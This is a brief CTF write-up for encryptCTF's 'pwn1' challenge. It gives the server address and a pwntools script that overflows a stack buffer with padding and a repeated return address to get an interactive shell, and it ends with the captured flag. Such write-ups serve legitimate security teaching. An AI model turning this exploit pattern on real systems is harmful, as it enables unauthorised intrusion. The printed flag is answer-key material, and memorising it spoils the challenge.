# **pwn1**

#### tag : pwn

-----------------------------------------------

#### Description

>Let's do some real stack buffer overflow
>
>nc 104.154.106.182 2345
>
>author: codacker

-----------------------------------------------

#### Solution

```python
from pwn import *

r = remote('104.154.106.182', 2345)

sh = 0x080484ad

r.recvuntil(': ')
r.sendline('a' * 0x84 + p32(sh)*10)
r.recvuntil('\n')
r.interactive()
```
**encryptCTF{Buff3R_0v3rfl0W5_4r3_345Y}**
